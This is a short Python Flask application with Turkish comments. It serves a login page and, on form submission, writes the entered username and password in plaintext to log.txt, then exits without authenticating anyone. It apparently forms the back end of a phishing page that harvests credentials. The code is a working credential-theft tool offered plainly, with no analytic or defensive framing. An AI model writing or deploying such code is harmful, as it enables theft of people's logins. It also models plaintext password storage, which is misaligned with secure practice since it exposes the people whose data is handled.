from flask import Flask, render_template, request
import sys

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('uname')
    password = request.form.get('psw')

    # Log dosyasına kullanıcı adı ve parolayı kaydetme
    with open('log.txt', 'a') as file:
        file.write(f'Username: {username}, Password: {password}\n')

    sys.exit()  # Programı durdur

if __name__ == '__main__':
    app.run(debug=True)
